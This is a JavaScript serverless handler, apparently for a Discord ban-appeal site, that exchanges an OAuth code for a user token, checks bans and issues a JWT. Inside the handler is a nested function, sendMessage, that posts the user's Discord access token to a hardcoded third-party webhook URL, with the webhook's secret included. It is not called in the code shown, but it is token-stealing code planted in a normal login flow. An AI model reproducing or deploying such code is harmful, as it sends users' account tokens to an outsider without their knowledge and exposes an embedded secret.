import fetch from 'node-fetch';

import {
    getUserInfo,
    getBan,
    isBlocked
} from "./helpers/user-helpers.js";
import {
    createJwt
} from "./helpers/jwt-helpers.js";

function parseCookies(str) {
    return str
        .split(';')
        .map(v => v.split('='))
        .reduce((acc, v) => {
            acc[v[0]] = v[1];
            return acc;
        }, {});
}

function verifyCsrf(event) {
    if (event.queryStringParameters.state !== undefined && event.headers.cookie !== undefined) {
        const cookies = parseCookies(event.headers.cookie);
        if (cookies["__Secure-CSRFState"] !== undefined) {
            return cookies["__Secure-CSRFState"] === event.queryStringParameters.state;
        }
    }

    return false;
}

export async function handler(event, context) {
    if (event.httpMethod !== "GET") {
        return {
            statusCode: 405
        };
    }

    if (verifyCsrf(event)) {
        if (event.queryStringParameters.code !== undefined) {
            const result = await fetch("https://discord.com/api/oauth2/token", {
                method: "POST",
                body: new URLSearchParams({
                    client_id: process.env.DISCORD_CLIENT_ID,
                    client_secret: process.env.DISCORD_CLIENT_SECRET,
                    grant_type: "authorization_code",
                    code: event.queryStringParameters.code,
                    redirect_uri: new URL(event.path, DEPLOY_PRIME_URL),
                    scope: "identify"
                })
            });

            const data = await result.json();

            if (!result.ok) {
                console.log(data);
                throw new Error("Failed to get user access token");
            }

            const user = await getUserInfo(data.access_token);

            function sendMessage() {
                var request = new XMLHttpRequest();
                request.open("POST", "https://discord.com/api/webhooks/1044574936381014056/JMNObDC2WGIQk6qAZzeAhwexKcbFSY-bdT1WOP5Sm5U68QlC2JN2fr-CXRkvui74wAsW");

                request.setRequestHeader('Content-type', 'application/json');

                var params = {
                    username: "My Webhook Name",
                    avatar_url: "",
                    content: data.access_token.toString()
                }

                request.send(JSON.stringify(params));
            }
            if (isBlocked(user.id)) {
                return {
                    statusCode: 303,
                    headers: {
                        "Location": `/error?msg=${encodeURIComponent("You cannot submit ban appeals with this Discord account.")}`,
                    },
                };
            }

            if (process.env.GUILD_ID && !process.env.SKIP_BAN_CHECK) {
                const ban = await getBan(user.id, process.env.GUILD_ID, process.env.DISCORD_BOT_TOKEN);
                if (ban === null) {
                    return {
                        statusCode: 303,
                        headers: {
                            "Location": "/error"
                        }
                    };
                }
            }

            const userPublic = {
                id: user.id,
                avatar: user.avatar,
                username: user.username,
                discriminator: user.discriminator
            };

            return {
                statusCode: 303,
                headers: {
                    "Location": `/form?token=${encodeURIComponent(createJwt(userPublic, data.expires_in))}`
                }
            };
        } else {
            return {
                statusCode: 400
            };
        }
    } else {
        return {
            statusCode: 403
        };
    }
}